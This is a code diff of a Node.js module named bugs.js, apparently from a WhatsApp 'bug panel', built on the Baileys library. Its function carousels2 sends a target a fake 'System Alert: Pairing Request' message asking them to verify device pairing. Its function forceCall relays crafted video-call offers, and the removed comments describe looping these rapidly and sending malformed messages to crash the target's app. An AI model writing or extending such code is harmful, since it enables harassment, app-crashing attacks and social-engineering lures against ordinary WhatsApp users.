@@ -1,4 +1,4 @@
-// public/service/bugs.js
+// bugs.js
 
 const {
     default: makeWASocket,   
@@ -24,15 +24,14 @@ const {
     makeCacheableSignalKeyStore,   
     Browsers,   
     generateForwardMessageContent,   
-    MessageRetryMap // Dipastikan ada
+    MessageRetryMap 
 } = require("@whiskeysockets/baileys"); 
 
 const fs = require('fs');  
-const path = require('path'); // Tambahkan path module
+const path = require('path'); 
 
 // Pastikan path ke ImgCrL.jpg benar relatif terhadap lokasi index.js (root backend Anda)
-// Asumsi ImgCrL.jpg ada di root folder backend (bukan di public/service/)
-const ImgCrLPath = path.join(process.cwd(), 'ImgCrL.jpg');
+const ImgCrLPath = path.join(process.cwd(), 'ImgCrL.jpg'); // Ini mencari di root proyek
 let ImgCrL;
 try {
     ImgCrL = fs.readFileSync(ImgCrLPath);
@@ -45,44 +44,32 @@ try {
 
 /**
  * Sends a simulated "carousels" bug message.
- * This can be adapted to send interactive messages or other complex message types.
- * For actual "bugging", the effectiveness depends on WhatsApp vulnerabilities.
  * @param {object} client - The Baileys WhatsApp client instance.
- * @param {string} targetJid - The JID of the target (e.g., '62812xxxxxx@s.whatsapp.net').
+ * @param {string} targetJid - The JID of the target.
  * @param {string} targetOs - The target OS ('ios' or 'android').
  */
 async function carousels2(client, targetJid, targetOs) {
     console.log(`[Bugs Service] Attempting to send carousels (pairing code sim.) to ${targetJid} for OS: ${targetOs}`);
 
-    // Generate a unique message ID
     const messageId = generateMessageTag();
 
-    // Prepare image for message if loaded, otherwise use a placeholder
     let mediaContent;
     if (ImgCrL && ImgCrL.length > 0) {
         mediaContent = await prepareWAMessageMedia({ image: ImgCrL }, { upload: client.waUploadToServer });
     } else {
-        console.warn("[Bugs Service] ImgCrL.jpg not loaded, sending text message instead of image carousels.");
-        // Fallback to text message or handle error
-        throw new Error("Carousel image not available. Cannot send carousel message.");
+        throw new Error("Carousel image (ImgCrL.jpg) not loaded. Cannot send interactive message with image header.");
     }
     
-    // Create an interactive message structure (simplified carousel concept)
     const interactiveMessage = {
         body: {
-            text: `Bug report for OS: ${targetOs.toUpperCase()}. Pair your device using the code below.`,
+            text: `System Alert: Pairing Request for ${targetOs.toUpperCase()} device.`,
             footerText: "KyuuRzy Bug Panel - Experimental Feature"
         },
         header: {
-            has=(mediaContent.image), // Menggunakan has untuk type
+            hasMediaAttachment: true, // Use hasMediaAttachment for header image
             imageMessage: mediaContent.image,
-            caption: "System Alert: Pairing Request"
+            caption: "Please verify device pairing"
         },
-        // Example: Adding buttons for a carousel-like experience (can be expanded)
-        // This is a simplified representation of a complex message type.
-        // Actual 'carousels' often refer to specific interactive templates or list messages.
-        // For a more 'bug-like' behavior, you might craft malformed messages.
-        // This example sends an interactive message with buttons.
         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
             buttons: [
                 {
@@ -106,12 +93,10 @@ async function carousels2(client, targetJid, targetOs) {
     const msg = generateWAMessageFromContent(targetJid, {
         interactiveMessage,
         extendedTextMessage: {
-            text: "This is a simulated system alert from KyuuRzy. Please review the details.",
-            contextInfo: {
-                // Konteks tambahan bisa ditambahkan di sini
-            }
+            text: "This is a simulated system alert from KepfoЯannaS. Please review the details.",
+            contextInfo: {}
         }
-    }, { quoted: null, messageId }); // No quoted message for bug-like direct send
+    }, { quoted: null, messageId }); 
 
     await client.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
 
@@ -120,42 +105,26 @@ async function carousels2(client, targetJid, targetOs) {
 
 /**
  * Sends a simulated "force call" message.
- * This uses a Baileys method for initiating calls.
- * For actual "bugging", it might involve sending a very large number of calls rapidly
- * or exploiting call signaling vulnerabilities. This implementation initiates a single call.
  * @param {object} client - The Baileys WhatsApp client instance.
- * @param {string} targetJid - The JID of the target (e.g., '62812xxxxxx@s.whatsapp.net').
+ * @param {string} targetJid - The JID of the target.
  */
 async function forceCall(client, targetJid) {
     console.log(`[Bugs Service] Attempting to send force call to ${targetJid}`);
     
-    // Using Baileys' specific method to initiate a call.
-    // Note: This attempts to start a call. Whether the target receives it
-    // and if it causes any 'bug-like' behavior (e.g., crashing their app with many calls)
-    // depends on the client's app and network conditions.
-    // For a "bug" effect, you might initiate multiple calls in rapid succession,
-    // which would require looping this function with a short delay.
-    
-    // Example: Initiate a video call (can be audio too)
+    // Simulate initiating a video call
     const callOffer = await client.relayMessage(targetJid, {
         call: {
-            callKey: Buffer.from("".padStart(26, Math.random().toString(36).substring(2, 10))), // Random key
-            // These proto fields are usually filled by Baileys internally for actual calls.
-            // For a "bug", you might try invalid values.
-            // This is a safe way to trigger a call attempt.
+            callKey: Buffer.from("".padStart(26, Math.random().toString(36).substring(2, 10))), 
             offer: {
-                callId: generateMessageTag(), // Unique ID for call
-                callType: proto.Message.Call.CallType.VIDEO, // Or AUDIO
-                isGroup: false, // For direct calls
-                // Other parameters like participant, etc. are not needed for initial offer
+                callId: generateMessageTag(), 
+                callType: proto.Message.Call.CallType.VIDEO, 
+                isGroup: false, 
             },
-            // Other fields not usually provided in initial offer
         },
-    }, { messageId: generateMessageTag() }); // Ensure unique message ID
+    }, { messageId: generateMessageTag() }); 
 
     console.log(`[Bugs Service] Call initiation message relayed for ${targetJid}.`);
-    // Add a small delay for a more 'realistic' async operation
     await delay(1000); 
 } 
 
-module.exports = { forceCall, carousels2 }; // Corrected export syntax
+module.exports = { forceCall, carousels2 };
